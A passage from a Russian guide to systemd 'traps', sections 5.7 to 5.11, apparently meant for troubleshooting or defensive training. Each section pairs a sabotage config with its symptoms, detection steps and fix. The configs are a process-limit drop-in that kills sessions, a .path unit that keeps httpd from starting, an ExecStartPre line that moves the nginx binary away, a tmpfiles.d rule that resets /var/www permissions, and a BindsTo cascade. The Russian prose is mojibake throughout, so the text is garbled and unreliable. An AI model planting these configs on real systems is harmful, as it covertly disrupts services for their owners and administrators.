*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è **drop-in** –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ —à–∞–±–ª–æ–Ω–∞ `user@.service`, –∫–æ—Ç–æ—Ä—ã–π —É–ø—Ä–∞–≤–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º–∏ —Å–µ—Å—Å–∏—è–º–∏. –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –æ—á–µ–Ω—å –Ω–∏–∑–∫–∏–π –ª–∏–º–∏—Ç –Ω–∞ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ (`LimitNPROC`). –≠—Ç–æ–≥–æ –ª–∏–º–∏—Ç–∞ —Ö–≤–∞—Ç–∞–µ—Ç –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –æ–±–æ–ª–æ—á–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –Ω–æ –ø—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –∑–∞–ø—É—Å—Ç–∏—Ç—å –µ—â–µ –æ–¥–∏–Ω –ø—Ä–æ—Ü–µ—Å—Å (–Ω–∞–ø—Ä–∏–º–µ—Ä, `su`), –ª–∏–º–∏—Ç –ø—Ä–µ–≤—ã—à–∞–µ—Ç—Å—è, –∏ systemd –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –∑–∞–≤–µ—Ä—à–∞–µ—Ç —Å–µ—Å—Å–∏—é –∏–∑-–∑–∞ –Ω–µ—Ö–≤–∞—Ç–∫–∏ —Ä–µ—Å—É—Ä—Å–æ–≤.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    1.  **–°–æ–∑–¥–∞–Ω–∏–µ –ª–æ–≤—É—à–∫–∏:** –°–æ–∑–¥–∞–µ—Ç—Å—è —Ñ–∞–π–ª `/etc/systemd/system/user@.service.d/low_nproc.conf`, –∫–æ—Ç–æ—Ä—ã–π –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –¥–ª—è *–≤—Å–µ—Ö* –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö —Å–µ—Å—Å–∏–π.
        ```ini
        # /etc/systemd/system/user@.service.d/low_nproc.conf
        [Service]
        # –õ–∏–º–∏—Ç–∞ –≤ 3 –ø—Ä–æ—Ü–µ—Å—Å–∞ —Ö–≤–∞—Ç–∏—Ç —Ç–æ–ª—å–∫–æ –Ω–∞ –∑–∞–ø—É—Å–∫ –æ–±–æ–ª–æ—á–∫–∏
        LimitNPROC=3
        ```
    2.  **–ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ:**
        ```bash
        sudo systemctl daemon-reload
        ```
    3.  **–°–∏–º–ø—Ç–æ–º:** –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É—Å–ø–µ—à–Ω–æ –≤—Ö–æ–¥–∏—Ç –ø–æ SSH, –Ω–æ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ `su - root` —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –æ–±—Ä—ã–≤–∞–µ—Ç—Å—è.

*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:**
    1.  **–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ª–æ–≥–∏:** `journalctl -b -p err..warning` –ø–æ–∫–∞–∂–µ—Ç –æ—à–∏–±–∫—É `user@0.service: Failed with result 'resources'`, —É–∫–∞–∑—ã–≤–∞—è, —á—Ç–æ —Å–µ—Å—Å–∏—è –¥–ª—è `root` (UID 0) –Ω–µ –∑–∞–ø—É—Å—Ç–∏–ª–∞—Å—å –∏–∑-–∑–∞ –ø—Ä–æ–±–ª–µ–º—ã —Å —Ä–µ—Å—É—Ä—Å–∞–º–∏.
    2.  **–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é:** –ö–æ–º–∞–Ω–¥–∞ `systemctl cat user@.service` –ø–æ–∫–∞–∂–µ—Ç –≤—Å–µ –ø—Ä–∏–º–µ–Ω–µ–Ω–Ω—ã–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏, –≤–∫–ª—é—á–∞—è "–≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π" drop-in —Ñ–∞–π–ª.
    3.  **–ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:** –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª `/etc/systemd/system/user@.service.d/low_nproc.conf` –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å `sudo systemctl daemon-reload`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.8. –õ–æ–≤—É—à–∫–∞ systemd: –ê–∫—Ç–∏–≤–∞—Ü–∏—è –ø–æ –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–µ–º—É –ø—É—Ç–∏ (.path)

*   **üéØ –¶–µ–ª—å:** –°–¥–µ–ª–∞—Ç—å —Ç–∞–∫, —á—Ç–æ–±—ã –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω–∞—è —Å–ª—É–∂–±–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –≤–µ–±-—Å–µ—Ä–≤–µ—Ä) –Ω–µ –∑–∞–ø—É—Å–∫–∞–ª–∞—Å—å –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ —Å–∏—Å—Ç–µ–º—ã, —Ö–æ—Ç—è –µ–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –≤—ã–≥–ª—è–¥–∏—Ç –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –°–ª—É–∂–±–∞ –æ—Ç–∫–ª—é—á–∞–µ—Ç—Å—è –æ—Ç —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–≥–æ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ (`systemctl disable`). –í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ —Å–æ–∑–¥–∞–µ—Ç—Å—è –æ–¥–Ω–æ–∏–º–µ–Ω–Ω—ã–π `.path` —é–Ω–∏—Ç, –∫–æ—Ç–æ—Ä—ã–π –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç —Å–ª—É–∂–±—É —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞. –ï—Å–ª–∏ —ç—Ç–æ—Ç —Ñ–∞–π–ª –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –∏–ª–∏ –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –º–µ–Ω—è–µ—Ç—Å—è, —Å–ª—É–∂–±–∞ –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –∑–∞–ø—É—Å—Ç–∏—Ç—Å—è.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    1.  **–°–æ–∑–¥–∞–Ω–∏–µ –ª–æ–≤—É—à–∫–∏:** –í–µ–±-—Å–µ—Ä–≤–µ—Ä –æ—Ç–∫–ª—é—á–∞–µ—Ç—Å—è, –∏ —Å–æ–∑–¥–∞–µ—Ç—Å—è —Ñ–∞–π–ª `/etc/systemd/system/httpd.path`.
        ```ini
        # /etc/systemd/system/httpd.path
        [Path]
        # –°–ª—É–∂–±–∞ –∑–∞–ø—É—Å—Ç–∏—Ç—Å—è, —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –∫—Ç–æ-—Ç–æ —Å–æ–∑–¥–∞—Å—Ç/–∏–∑–º–µ–Ω–∏—Ç —ç—Ç–æ—Ç —Ñ–∞–π–ª
        PathModified=/var/run/httpd-ready

        [Install]
        WantedBy=multi-user.target
        ```
    2.  **–°–∏–º–ø—Ç–æ–º:** `systemctl status httpd.service` –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç `inactive (dead)`, –Ω–æ `systemctl status httpd.path` –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç `active (waiting)`.

*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:**
    1.  **–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏:** –ï—Å–ª–∏ —Å–ª—É–∂–±–∞ `A.service` –Ω–µ–∞–∫—Ç–∏–≤–Ω–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –Ω–∞–ª–∏—á–∏–µ —é–Ω–∏—Ç–æ–≤ `A.path` –∏–ª–∏ `A.socket` –∫–æ–º–∞–Ω–¥–æ–π `systemctl list-unit-files | grep <service_name>`.
    2.  **–ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:** –û—Ç–∫–ª—é—á–∏—Ç—å –∏ —É–¥–∞–ª–∏—Ç—å –ª–æ–≤—É—à–∫—É (`sudo systemctl disable httpd.path`, `sudo rm /etc/systemd/system/httpd.path`), –∞ –∑–∞—Ç–µ–º –≤–∫–ª—é—á–∏—Ç—å –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—É—é —Å–ª—É–∂–±—É (`sudo systemctl enable httpd.service`).

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.9. –õ–æ–≤—É—à–∫–∞ systemd: –î–µ—Å—Ç—Ä—É–∫—Ç–∏–≤–Ω–æ–µ –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ (Drop-in)

*   **üéØ –¶–µ–ª—å:** –°–∫—Ä—ã—Ç–æ –Ω–∞—Ä—É—à–∏—Ç—å —Ä–∞–±–æ—Ç—É –ª–µ–≥–∏—Ç–∏–º–Ω–æ–π —Å–ª—É–∂–±—ã, –∑–∞—Å—Ç–∞–≤–∏–≤ –µ–µ –ø–∞–¥–∞—Ç—å –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è drop-in —Ñ–∞–π–ª –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ `/etc/systemd/system/<unit-name>.d/`. –í —ç—Ç–æ—Ç —Ñ–∞–π–ª –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –¥–∏—Ä–µ–∫—Ç–∏–≤–∞ `ExecStartPre`, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é –∫–æ–º–∞–Ω–¥—É (–Ω–∞–ø—Ä–∏–º–µ—Ä, —É–¥–∞–ª—è–µ—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª —Å–ª—É–∂–±—ã) *–ø–µ—Ä–µ–¥* –µ–µ –æ—Å–Ω–æ–≤–Ω—ã–º –∑–∞–ø—É—Å–∫–æ–º.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    1.  **–°–æ–∑–¥–∞–Ω–∏–µ –ª–æ–≤—É—à–∫–∏:** –î–ª—è —Å–ª—É–∂–±—ã `nginx.service` —Å–æ–∑–¥–∞–µ—Ç—Å—è —Ñ–∞–π–ª `/etc/systemd/system/nginx.service.d/override.conf`.
        ```ini
        # /etc/systemd/system/nginx.service.d/override.conf
        [Service]
        # –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ –ø–µ—Ä–µ–º–µ—Å—Ç–∏—Ç –±–∏–Ω–∞—Ä–Ω–∏–∫ nginx –ø–µ—Ä–µ–¥ –µ–≥–æ –∑–∞–ø—É—Å–∫–æ–º
        ExecStartPre=/bin/sh -c 'mv /usr/sbin/nginx /tmp/nginx.bak'
        ```
    2.  **–°–∏–º–ø—Ç–æ–º:** `systemctl start nginx` –º–≥–Ω–æ–≤–µ–Ω–Ω–æ –∑–∞–≤–µ—Ä—à–∞–µ—Ç—Å—è —Å –æ—à–∏–±–∫–æ–π. –í –ª–æ–≥–∞—Ö (`journalctl -u nginx`) –±—É–¥–µ—Ç –≤–∏–¥–Ω–æ, —á—Ç–æ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω.

*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:**
    1.  **–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `systemctl cat`:** –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ ‚Äî –∫–ª—é—á –∫ —Ä–∞–∑–≥–∞–¥–∫–µ. `systemctl cat nginx.service` –ø–æ–∫–∞–∂–µ—Ç –æ–±—ä–µ–¥–∏–Ω–µ–Ω–Ω—É—é –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –∏–∑ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –∏ –≤—Å–µ—Ö drop-in —Ñ–∞–π–ª–æ–≤, –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ –≤—ã—è–≤–∏–≤ —Å–∫—Ä—ã—Ç—É—é –¥–∏—Ä–µ–∫—Ç–∏–≤—É `ExecStartPre`.
    2.  **–ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:** –£–¥–∞–ª–∏—Ç—å drop-in —Ñ–∞–π–ª, –≤–µ—Ä–Ω—É—Ç—å –Ω–∞ –º–µ—Å—Ç–æ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª (`sudo mv /tmp/nginx.bak /usr/sbin/nginx`) –∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é (`sudo systemctl daemon-reload`).

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.10. –õ–æ–≤—É—à–∫–∞ systemd: –°–±—Ä–æ—Å –ø—Ä–∞–≤ —á–µ—Ä–µ–∑ tmpfiles.d

*   **üéØ –¶–µ–ª—å:** –°–æ–∑–¥–∞—Ç—å –ø—Ä–æ–±–ª–µ–º—É —Å –ø—Ä–∞–≤–∞–º–∏ –¥–æ—Å—Ç—É–ø–∞, –∫–æ—Ç–æ—Ä–∞—è "–≤–æ–ª—à–µ–±–Ω—ã–º –æ–±—Ä–∞–∑–æ–º" –ø–æ—è–≤–ª—è–µ—Ç—Å—è —Å–Ω–æ–≤–∞ –ø–æ—Å–ª–µ –∫–∞–∂–¥–æ–π –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏, –¥–∞–∂–µ –µ—Å–ª–∏ –µ–µ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –≤—Ä—É—á–Ω—É—é.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** `systemd-tmpfiles` –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å–∏—Å—Ç–µ–º—ã –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç —Ñ–∞–π–ª—ã –≤ `/etc/tmpfiles.d/` –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è, —É–¥–∞–ª–µ–Ω–∏—è –∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø—Ä–∞–≤ –Ω–∞ —Ñ–∞–π–ª—ã –∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏. –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã–π —Ñ–∞–π–ª –º–æ–∂–µ—Ç –ø—Ä–∏ –∫–∞–∂–¥–æ–π –∑–∞–≥—Ä—É–∑–∫–µ —Å–±—Ä–∞—Å—ã–≤–∞—Ç—å –ø—Ä–∞–≤–∞ –Ω–∞ –∫—Ä–∏—Ç–∏—á–µ—Å–∫—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/var/www`) –Ω–∞ –Ω–µ–≤–µ—Ä–Ω—ã–µ.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    1.  **–°–æ–∑–¥–∞–Ω–∏–µ –ª–æ–≤—É—à–∫–∏:** –°–æ–∑–¥–∞–µ—Ç—Å—è —Ñ–∞–π–ª `/etc/tmpfiles.d/web-lock.conf`.
        ```
        # /etc/tmpfiles.d/web-lock.conf
        # d - –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è, /var/www, –ø—Ä–∞–≤–∞ 0750, –≤–ª–∞–¥–µ–ª–µ—Ü root, –≥—Ä—É–ø–ø–∞ root
        d /var/www 0750 root root -
        ```
    2.  **–°–∏–º–ø—Ç–æ–º:** –ü–æ—Å–ª–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –Ω–µ –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–≤–æ–∏–º —Ñ–∞–π–ª–∞–º. –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –∏—Å–ø—Ä–∞–≤–ª—è–µ—Ç –ø—Ä–∞–≤–∞ (`chmod 755 /var/www`), –Ω–æ –ø–æ—Å–ª–µ —Å–ª–µ–¥—É—é—â–µ–π –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ –ø—Ä–æ–±–ª–µ–º–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è.

*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:**
    1.  **–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é:** –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –≤—Å–µ—Ö —Ñ–∞–π–ª–æ–≤ –≤ `/etc/tmpfiles.d/`, `/run/tmpfiles.d/` –∏ `/usr/lib/tmpfiles.d/`.
    2.  **–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `systemd-tmpfiles`:** –ö–æ–º–∞–Ω–¥–∞ `systemd-tmpfiles --cat-config` –ø–æ–∫–∞–∂–µ—Ç –≤—Å–µ –æ–±—ä–µ–¥–∏–Ω–µ–Ω–Ω—ã–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏, —á—Ç–æ –ø–æ–º–æ–∂–µ—Ç –Ω–∞–π—Ç–∏ —Å—Ç—Ä–æ–∫—É, –≤—ã–∑—ã–≤–∞—é—â—É—é –ø—Ä–æ–±–ª–µ–º—É.
    3.  **–ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:** –£–¥–∞–ª–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Ñ–∞–π–ª `/etc/tmpfiles.d/web-lock.conf`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.11. –õ–æ–≤—É—à–∫–∞ systemd: –ö–∞—Å–∫–∞–¥–Ω—ã–π —Å–±–æ–π —á–µ—Ä–µ–∑ BindsTo

*   **üéØ –¶–µ–ª—å:** –°–æ–∑–¥–∞—Ç—å —Å–∏—Ç—É–∞—Ü–∏—é, –∫–æ–≥–¥–∞ —Å–±–æ–π –æ–¥–Ω–æ–π, –≤–æ–∑–º–æ–∂–Ω–æ, –Ω–µ–∫—Ä–∏—Ç–∏—á–Ω–æ–π —Å–ª—É–∂–±—ã, –≤—ã–∑—ã–≤–∞–µ—Ç –Ω–µ–º–µ–¥–ª–µ–Ω–Ω—É—é –æ—Å—Ç–∞–Ω–æ–≤–∫—É –¥—Ä—É–≥–æ–π, –≤–∞–∂–Ω–æ–π —Å–ª—É–∂–±—ã, –º–∞—Å–∫–∏—Ä—É—è –∏—Å—Ç–∏–Ω–Ω—É—é –ø—Ä–∏—á–∏–Ω—É –æ—Ç–∫–∞–∑–∞.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –î–ª—è —Å–ª—É–∂–±—ã (`webserver.service`) —á–µ—Ä–µ–∑ drop-in —Ñ–∞–π–ª —Å–æ–∑–¥–∞–µ—Ç—Å—è –∂–µ—Å—Ç–∫–∞—è –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å `BindsTo` –æ—Ç –¥—Ä—É–≥–æ–π —Å–ª—É–∂–±—ã (`database.service`). –≠—Ç–∞ –¥–∏—Ä–µ–∫—Ç–∏–≤–∞ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –µ—Å–ª–∏ `database.service` –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –∏–ª–∏ –ø–∞–¥–∞–µ—Ç, `systemd` –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∏ –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç `webserver.service`.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    1.  **–°–æ–∑–¥–∞–Ω–∏–µ –ª–æ–≤—É—à–∫–∏:** –°–æ–∑–¥–∞–µ—Ç—Å—è —Ñ–∞–π–ª `/etc/systemd/system/webserver.service.d/dependency_trap.conf`.
        ```ini
        # /etc/systemd/system/webserver.service.d/dependency_trap.conf
        [Unit]
        # –ï—Å–ª–∏ database.service —É–ø–∞–¥–µ—Ç, webserver.service –±—É–¥–µ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω
        BindsTo=database.service
        ```
    2.  **–°–∏–º–ø—Ç–æ–º:** –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ—Ç `database.service`, –∏ –≤–Ω–µ–∑–∞–ø–Ω–æ `webserver.service` —Ç–æ–∂–µ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è. –í –ª–æ–≥–∞—Ö –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ –Ω–µ—Ç –æ—à–∏–±–æ–∫, —Ç–æ–ª—å–∫–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ —à—Ç–∞—Ç–Ω–æ–π –æ—Å—Ç–∞–Ω–æ–≤–∫–µ.

*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:**
    1.  **–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏:** `systemctl list-dependencies webserver.service` –º–æ–∂–µ—Ç –ø–æ–∫–∞–∑–∞—Ç—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å.
    2.  **–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `systemctl cat`:** `systemctl cat webserver.service` ‚Äî —Å–∞–º—ã–π –Ω–∞–¥–µ–∂–Ω—ã–π —Å–ø–æ—Å–æ–±. –û–Ω –ø–æ–∫–∞–∂–µ—Ç drop-in —Ñ–∞–π–ª –∏ –¥–∏—Ä–µ–∫—Ç–∏–≤—É `BindsTo=database.service`.
    3.  **–ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:** –£–¥–∞–ª–∏—Ç—å drop-in —Ñ–∞–π–ª `/etc/systemd/system/webserver.service.d/dependency_trap.conf` –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å `sudo systemctl daemon-reload`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)
